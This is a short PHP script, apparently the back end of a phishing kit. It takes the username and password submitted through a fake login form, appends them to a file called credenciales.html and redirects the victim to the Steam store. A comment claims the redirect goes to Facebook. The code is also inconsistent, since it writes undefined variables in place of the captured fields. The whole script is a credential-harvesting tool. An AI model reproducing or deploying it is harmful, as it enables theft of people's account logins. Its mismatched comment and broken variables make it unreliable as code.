<?php

$Correo = $_POST['username']; 

$Contraseña = $_POST['password'];

$SALTO="\r\n";

$f = fopen("credenciales.html", "a");
fwrite ($f, "----------------------------------".$SALTO.'Correo: '.$username.$SALTO.'Contraseña: '.$password.$SALTO."----------------------------------".$SALTO);
fclose($f);

sleep(2);

//Redireccione a la web original (Facebook)

header('Location: https://store.steampowered.com/');
?>